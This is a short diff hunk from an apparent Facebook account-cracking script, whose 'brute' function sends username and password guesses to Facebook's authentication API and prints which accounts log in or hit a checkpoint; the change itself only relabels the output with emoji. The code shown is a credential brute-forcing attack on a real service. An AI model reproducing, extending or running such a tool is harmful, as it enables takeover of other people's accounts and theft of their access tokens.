@@ -20,10 +20,10 @@ def brute(user, passs):
       api='https://b-api.facebook.com/method/auth.login'
       response=requests.get(api, params=params)
       if re.search('(EAAA)\w+', str(response.text)):
-        print('  [LIVE] %s -> %s '%(str(user), str(pw)))
+        print('  [SUKSES] %s 👉❤👈 %s '%(str(user), str(pw)))
         break
       elif 'www.facebook.com' in response.json()['error_msg']:
-        print('  [CHEK] %s -> %s '%(str(user), str(pw)))
+        print('  [CP] %s 👉💔👈 %s '%(str(user), str(pw)))
         break
   except: pass
 
